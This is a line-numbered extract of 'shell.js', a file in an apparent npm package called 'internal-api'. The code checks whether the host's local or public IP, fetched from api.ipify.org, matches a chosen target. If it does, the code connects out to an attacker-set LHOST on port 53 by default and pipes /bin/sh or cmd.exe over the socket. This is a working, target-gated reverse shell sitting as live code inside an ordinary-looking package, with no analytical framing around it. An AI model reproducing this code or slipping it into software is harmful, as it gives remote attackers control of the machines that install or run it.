// File: tmp/tmpyou7dgqz/internal-api/package/shell.js
// ======================================================================
Line 4: const net   = require('net')
Line 5: const os    = require('os')
Line 6: const https = require('https')
Line 7: _tmp_0 = require('child_process')
Line 11: parseInt(process.env.LPORT || '53', 10)
Line 16: for (const name of Object.keys(nets)) {
    for (const iface of nets[name] || []) {
      if (!iface.internal && iface.family === 'IPv4' && iface.address === TARGET_IP) {
        return true;
      }
    }
  }
Line 17: for (const iface of nets[name] || []) {
      if (!iface.internal && iface.family === 'IPv4' && iface.address === TARGET_IP) {
        return true;
      }
    }
Line 29: const req = https.get('https://api.ipify.org', res => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => cb(data.trim() === TARGET_IP));
  })
Line 32: data.trim()
Line 39: process.exit(0)
Line 41: const sock = net.connect(LPORT, LHOST, () => {
    const sh = spawn(process.platform === 'win32' ? 'cmd.exe' : '/bin/sh', []);
    sock.pipe(sh.stdin);
    sh.stdout.pipe(sock);
    sh.stderr.pipe(sock);
  })
Line 42: const sh = spawn(process.platform === 'win32' ? 'cmd.exe' : '/bin/sh', [])
Line 43: sock.pipe(sh.stdin)
Line 44: sh.stdout.pipe(sock)
Line 45: sh.stderr.pipe(sock)
Line 48: process.exit(0)
